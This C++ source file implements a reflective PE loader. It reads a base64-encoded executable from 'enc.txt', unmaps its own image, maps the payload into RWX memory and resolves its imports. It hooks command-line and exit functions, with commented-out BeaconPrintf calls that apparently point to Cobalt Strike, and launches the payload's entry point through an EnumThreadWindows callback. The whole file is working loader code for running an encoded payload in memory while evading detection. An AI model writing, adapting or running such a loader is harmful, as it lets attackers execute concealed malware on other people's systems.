// LordPE.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "base64.h"
#include <Windows.h>

struct FileData
{
	LPVOID data;
	size_t len;
};

FileData fileData;
BOOL hijackCmdline = FALSE;
char* sz_masqCmd_Ansi = NULL;
char* sz_masqCmd_ArgvAnsi[100];
wchar_t* sz_masqCmd_Widh = NULL;
wchar_t* sz_masqCmd_ArgvWidh[100];
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;

LPWSTR hookGetCommandLineW()
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinew");
	return sz_masqCmd_Widh;
}

LPSTR hookGetCommandLineA()
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinea");
	return sz_masqCmd_Ansi;
}

char*** __cdecl hook__p___argv(void)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argv");
	return &poi_masqArgvA;
}

wchar_t*** __cdecl hook__p___wargv(void)
{

	//BeaconPrintf(CALLBACK_OUTPUT, "called: __p___wargv");
	return &poi_masqArgvW;
}

int* __cdecl hook__p___argc(void)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argc");
	return &int_masqCmd_Argc;
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called __wgetmainargs");
	*_Argc = int_masqCmd_Argc;
	*_Argv = poi_masqArgvW;

	return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called __getmainargs");
	*_Argc = int_masqCmd_Argc;
	*_Argv = poi_masqArgvA;

	return 0;
}

_onexit_t __cdecl hook_onexit(_onexit_t function)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called onexit!\n");
	return 0;
}

int __cdecl hookatexit(void(__cdecl* func)(void))
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called atexit!\n");
	return 0;
}

int __cdecl hookexit(int status)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "Exit called!\n");
	//_cexit() causes cmd.exe to break for reasons unknown...
	ExitThread(0);
	return 0;
}

void __stdcall hookExitProcess(UINT statuscode)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "ExitProcess called!\n");
	ExitThread(0);
}

long GetFileSize(FILE *fp) {
	long n;
	fpos_t fpos;
	fgetpos(fp, &fpos); //用来获取文件内部指针
	fseek(fp, 0, SEEK_END);//先使用 fseek() 将文件内部指针定位到文件末尾，
	n = ftell(fp); //ftell() 函数用来获取文件内部指针（位置指针）距离文件开头的字节数
	fsetpos(fp, &fpos); //恢复原来的位置
	return n;
}

void GetData(char *FileName) {
	/*
	FILE* fp = fopen(FileName, "rb");
	if (fp == NULL) {
		printf("[-] Open File:%s Failure\n", FileName);
		exit(1);
	}
	long FileSize = GetFileSize(fp);
	printf("[*] FileSize:%ld\n", FileSize);

	fileData.len = FileSize;
	fileData.data = malloc(fileData.len);
	fread(fileData.data, fileData.len, 1, fp);
	fclose(fp);
	*/
	FILE *fp = fopen(FileName, "r");
	int fsize = GetFileSize(fp);
	char* fdata = (char *)malloc(fsize);
	char *dtxt = new char[fsize];
	int dlen = 0;
	fread(fdata, fsize, 1, fp);
	printf("filesize:%d\n", fsize);
	base64_decode(fdata, fsize, dtxt, &dlen);

	fileData.len = dlen;
	fileData.data = dtxt;
}

void LordPE() {
	char *pe_buffer = (char *)fileData.data;

	if (*(PWORD)pe_buffer != IMAGE_DOS_SIGNATURE) {
		printf("Not MZ flag\n");
	}

	IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER*)pe_buffer;
	const LONG kMaxOffset = 1024;
	LONG pe_offset = dos_header->e_lfanew;
	IMAGE_NT_HEADERS32* nt_header = (IMAGE_NT_HEADERS32*)(pe_buffer + pe_offset);
	printf("NT_HEADER -> 0x%x\n", nt_header);
	if (nt_header->Signature != IMAGE_NT_SIGNATURE) {
		printf("Not NT_HEADER\n");
	}
	size_t dir_id = IMAGE_DIRECTORY_ENTRY_BASERELOC;
	IMAGE_DATA_DIRECTORY* peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);
	LPVOID preferAddr = (LPVOID)nt_header->OptionalHeader.ImageBase;
	printf("Image_Base_Addr:0x%x\n", preferAddr);

	HMODULE dll = LoadLibraryA("ntdll.dll");
	((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)nt_header->OptionalHeader.ImageBase);
	BYTE *pImage = (BYTE *)VirtualAlloc(preferAddr, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pImage) {
		pImage = (BYTE *)VirtualAlloc(NULL, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!pImage) {
			printf("[-] ImageAddress VirtualAlloc Failure\n");
		}
		else {
			printf("[*] VirtualAlloc RWX Sucess\n");
		}
	}
	nt_header->OptionalHeader.ImageBase = (size_t)pImage; //基址修改为分配的内存地址
	memcpy(pImage, pe_buffer, nt_header->OptionalHeader.SizeOfHeaders);//PE数据移动到分配的内存


	IMAGE_SECTION_HEADER *SectionHeaddr = (IMAGE_SECTION_HEADER*)(size_t(nt_header) + sizeof(IMAGE_NT_HEADERS));
	printf("[*] SectionHeader:0x%x\n", SectionHeaddr);
	for (int i = 0;i < nt_header->FileHeader.NumberOfSections;i++) { //区段移动到分配的内存
		DWORD dwRva = SectionHeaddr[i].VirtualAddress;
		DWORD dwFOA = SectionHeaddr[i].PointerToRawData;
		DWORD dwSize = SectionHeaddr[i].SizeOfRawData; //区段对应的大小
		char *SectionName = (char*)SectionHeaddr[i].Name;
		LPVOID SecDataSrc = LPVOID(pe_buffer + dwFOA); //获取PE对应区段数据起始位置
		LPVOID SecDataDst = LPVOID(pImage + dwRva);//在分配内存里对应的存储的位置
		memcpy(SecDataDst, SecDataSrc, dwSize);
		printf("[*] Move %s Section, SecDataSrc:%x - SectionDst:%x \n", SectionName, SecDataSrc, SecDataDst);
	}
	//printf("1111\n");


	IMAGE_DATA_DIRECTORY* importsDir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
	size_t maxSize = importsDir->Size;
	size_t impAddr = importsDir->VirtualAddress;
	printf("IMAGE_DIRECTORY_ENTRY_IMPORT - VirtualAddress:0x%x,Size:0x%x\n", impAddr, maxSize);

	IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
	size_t parsedSize = 0;
	for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)pImage);

		if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
		LPSTR lib_name = (LPSTR)((ULONGLONG)pImage + lib_desc->Name);

		size_t call_via = lib_desc->FirstThunk;
		size_t thunk_addr = lib_desc->OriginalFirstThunk;
		if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

		size_t offsetField = 0;
		size_t offsetThunk = 0;

		while (true)
		{
			IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(pImage) + offsetField + call_via);
			IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(pImage) + offsetThunk + thunk_addr);

			if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
			{
				size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
				fieldThunk->u1.Function = addr;
			}

			if (fieldThunk->u1.Function == NULL) break;

			if (fieldThunk->u1.Function == orginThunk->u1.Function) {

				PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(pImage)+orginThunk->u1.AddressOfData);
				LPSTR func_name = (LPSTR)by_name->Name;

				//printf("%s %s\n", lib_name, func_name);
				size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);


				if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
				{
					fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
				}
				else if (hijackCmdline && _stricmp(func_name, "GetCommandLineW") == 0)
				{
					fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
				}
				else if (hijackCmdline && _stricmp(func_name, "__wgetmainargs") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__wgetmainargs;
				}
				else if (hijackCmdline && _stricmp(func_name, "__getmainargs") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__getmainargs;
				}
				else if (hijackCmdline && _stricmp(func_name, "__p___argv") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__p___argv;
				}
				else if (hijackCmdline && _stricmp(func_name, "__p___wargv") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__p___wargv;
				}
				else if (hijackCmdline && _stricmp(func_name, "__p___argc") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__p___argc;
				}
				else if (hijackCmdline && (_stricmp(func_name, "exit") == 0 || _stricmp(func_name, "_Exit") == 0 || _stricmp(func_name, "_exit") == 0 || _stricmp(func_name, "quick_exit") == 0))
				{
					fieldThunk->u1.Function = (size_t)hookexit;
				}
				else if (hijackCmdline && _stricmp(func_name, "ExitProcess") == 0)
				{
					fieldThunk->u1.Function = (size_t)hookExitProcess;
				}
				else
					fieldThunk->u1.Function = addr;

			}
			offsetField += sizeof(IMAGE_THUNK_DATA);
			offsetThunk += sizeof(IMAGE_THUNK_DATA);
		}
	}
	size_t retAddr = (size_t)(pImage)+nt_header->OptionalHeader.AddressOfEntryPoint;

	EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);

}

int main()
{
	char *FilePath = "enc.txt";
	GetData(FilePath);
	LordPE();
	system("pause");
	return 0;
}

